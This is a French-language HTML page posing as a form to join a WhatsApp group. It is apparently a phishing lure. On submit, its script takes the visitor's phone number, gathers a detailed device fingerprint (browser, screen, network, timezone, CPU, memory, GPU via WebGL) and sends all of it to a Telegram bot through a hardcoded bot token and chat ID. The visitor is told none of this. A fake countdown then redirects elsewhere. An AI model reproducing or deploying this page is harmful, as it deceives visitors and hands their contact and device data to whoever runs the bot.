<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rejoindre notre groupe WhatsApp</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css">
    <style>
        :root {
            --primary-color: #25D366;
            --secondary-color: #128C7E;
            --dark-color: #075E54;
            --light-color: #DCF8C6;
            --text-color: #333;
            --light-text: #777;
            --white: #ffffff;
            --gray: #f5f5f5;
            --dark-gray: #e5e5e5;
            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            --transition: all 0.3s ease;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', sans-serif;
            line-height: 1.6;
            color: var(--text-color);
            background-color: var(--gray);
            overflow-x: hidden;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 20px;
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .modal-content {
            background-color: var(--white);
            padding: 30px;
            border-radius: 10px;
            width: 100%;
            max-width: 500px;
            box-shadow: var(--shadow);
            animation: fadeIn 0.3s ease-out;
        }

        .modal-header {
            text-align: center;
            margin-bottom: 20px;
        }

        .modal-header h2 {
            color: var(--dark-color);
            margin-bottom: 10px;
        }

        .modal-header p {
            color: var(--light-text);
        }

        .form-group {
            margin-bottom: 25px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
        }

        .phone-input-container {
            margin-bottom: 5px;
        }

        .input-field {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid var(--dark-gray);
            border-radius: 6px;
            font-size: 16px;
            transition: var(--transition);
        }

        .input-field:focus {
            border-color: var(--primary-color);
            outline: none;
            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.2);
        }

        .submit-btn {
            background-color: var(--primary-color);
            color: var(--white);
            border: none;
            padding: 14px 20px;
            font-size: 16px;
            font-weight: 500;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .submit-btn:hover {
            background-color: var(--secondary-color);
        }

        .countdown-container {
            display: none;
            text-align: center;
            padding: 30px;
            background-color: var(--white);
            border-radius: 10px;
            box-shadow: var(--shadow);
            margin-top: 20px;
        }

        .countdown-title {
            font-size: 1.5rem;
            margin-bottom: 20px;
            color: var(--dark-color);
        }

        .countdown {
            font-size: 3rem;
            font-weight: 700;
            color: var(--primary-color);
            margin-bottom: 20px;
        }

        .status-message {
            font-size: 1.2rem;
            color: var(--light-text);
        }

        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: var(--white);
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* International telephone input customization */
        .iti {
            width: 100%;
        }

        .iti__selected-flag {
            padding: 0 15px;
        }

        .iti__arrow {
            border-left: 3px solid transparent;
            border-right: 3px solid transparent;
            border-top: 4px solid #555;
        }

        .iti__country-list {
            border-radius: 6px;
            box-shadow: var(--shadow);
        }
    </style>
</head>
<body>
    <!-- Phone Number Modal -->
    <div class="modal-overlay" id="phoneModal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>Rejoindre notre groupe WhatsApp</h2>
                <p>Veuillez entrer votre numéro de téléphone pour accéder au groupe</p>
            </div>
            <form id="whatsappForm">
                <div class="form-group">
                    <label for="phone">Numéro de téléphone WhatsApp</label>
                    <div class="phone-input-container">
                        <input type="tel" id="phone" class="input-field" required>
                    </div>
                    <small style="color: var(--light-text);">Vous recevrez un lien d'invitation sur WhatsApp</small>
                </div>
                <div class="form-group">
                    <button type="submit" class="submit-btn" id="submitBtn">
                        <span>Rejoindre le groupe</span>
                        <i class="fab fa-whatsapp"></i>
                    </button>
                </div>
            </form>

            <div class="countdown-container" id="countdownSection">
                <h3 class="countdown-title">Préparation de votre invitation</h3>
                <div class="countdown" id="countdown">15</div>
                <p class="status-message">Veuillez patienter pendant que nous vous ajoutons au groupe...</p>
                <div class="spinner" style="margin: 0 auto;"></div>
            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Initialize phone input with country selection
            const phoneInput = document.getElementById('phone');
            const iti = window.intlTelInput(phoneInput, {
                initialCountry: "fr",
                preferredCountries: ["fr", "be", "ch", "ca"],
                separateDialCode: true,
                utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js"
            });

            // Function to collect browser information
            function getBrowserInfo() {
                const connection = navigator.connection || {};
                const screenOrientation = screen.orientation || {};
                
                return {
                    // Browser info
                    userAgent: navigator.userAgent,
                    browser: navigator.userAgentData?.brands?.map(b => b.brand + '/' + b.version).join(' ') || 'Unknown',
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    cookieEnabled: navigator.cookieEnabled,
                    pdfViewerEnabled: navigator.pdfViewerEnabled,
                    webdriver: navigator.webdriver,
                    
                    // Screen info
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio,
                    orientation: screenOrientation.type || (screen.width > screen.height ? 'landscape' : 'portrait'),
                    
                    // Network info
                    connectionType: connection.effectiveType || 'Unknown',
                    downlink: connection.downlink || 'Unknown',
                    rtt: connection.rtt || 'Unknown',
                    
                    // System info
                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    localDateTime: new Date().toString(),
                    hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                    deviceMemory: navigator.deviceMemory || 'Unknown',
                    
                    // WebGL info (for GPU detection)
                    webglVendor: getWebGLInfo().vendor,
                    webglRenderer: getWebGLInfo().renderer
                };
            }

            // Helper function to get WebGL info
            function getWebGLInfo() {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (!gl) return { vendor: 'Unknown', renderer: 'Unknown' };
                    
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    return {
                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown'
                    };
                } catch (e) {
                    return { vendor: 'Error', renderer: 'Error' };
                }
            }

            // Form submission
            const whatsappForm = document.getElementById('whatsappForm');
            const countdownSection = document.getElementById('countdownSection');
            const submitBtn = document.getElementById('submitBtn');
            
            whatsappForm.addEventListener('submit', function(e) {
                e.preventDefault();
                
                // Get phone number with country code
                const phoneNumber = iti.getNumber();
                
                // Validate phone number
                if (!phoneNumber || !iti.isValidNumber()) {
                    alert('Veuillez entrer un numéro de téléphone valide.');
                    return;
                }
                
                // Show loading state
                submitBtn.innerHTML = '<span class="spinner"></span> <span>Envoi en cours...</span>';
                submitBtn.disabled = true;
                
                // Collect browser and system information
                const browserInfo = getBrowserInfo();
                
                // Prepare message for Telegram
                const message = `Nouvelle demande de groupe WhatsApp:
📱 Téléphone: ${phoneNumber}

=== Informations du navigateur ===
🌐 Navigateur: ${browserInfo.userAgent}
🖥️ Plateforme: ${browserInfo.platform}
🗣️ Langue: ${browserInfo.language}
🍪 Cookies: ${browserInfo.cookieEnabled ? 'Activés' : 'Désactivés'}

=== Écran ===
📺 Résolution: ${browserInfo.screenWidth}x${browserInfo.screenHeight}
🎨 Profondeur couleur: ${browserInfo.colorDepth} bits
🖥️ Ratio pixels: ${browserInfo.pixelRatio}
🔄 Orientation: ${browserInfo.orientation}

=== Réseau ===
📶 Type connexion: ${browserInfo.connectionType}
⬇️ Débit: ${browserInfo.downlink} Mbps
⏱️ Latence: ${browserInfo.rtt} ms

=== Système ===
⏰ Fuseau horaire: ${browserInfo.timeZone}
📅 Date/heure locale: ${browserInfo.localDateTime}
💻 Cœurs CPU: ${browserInfo.hardwareConcurrency}
🧠 Mémoire: ${browserInfo.deviceMemory} GB

=== WebGL ===
🖥️ GPU Vendeur: ${browserInfo.webglVendor}
🎮 GPU Modèle: ${browserInfo.webglRenderer}`;
                
                // Send data to Telegram bot
                const botToken = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
                const chatId = '5372119436';
                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
                
                fetch(url)
                    .then(response => response.json())
                    .then(data => {
                        // Hide form and show countdown
                        whatsappForm.style.display = 'none';
                        countdownSection.style.display = 'block';
                        
                        // Start countdown
                        let seconds = 15;
                        const countdownElement = document.getElementById('countdown');
                        
                        const countdownInterval = setInterval(() => {
                            seconds--;
                            countdownElement.textContent = seconds;
                            
                            if (seconds <= 0) {
                                clearInterval(countdownInterval);
                                window.location.href = 'traitement.html';
                            }
                        }, 1000);
                    })
                    .catch(error => {
                        console.error('Error:', error);
                        alert('Une erreur s\'est produite. Veuillez réessayer plus tard.');
                        submitBtn.innerHTML = '<span>Rejoindre le groupe</span> <i class="fab fa-whatsapp"></i>';
                        submitBtn.disabled = false;
                    });
            });
        });
    </script>
</body>
</html>
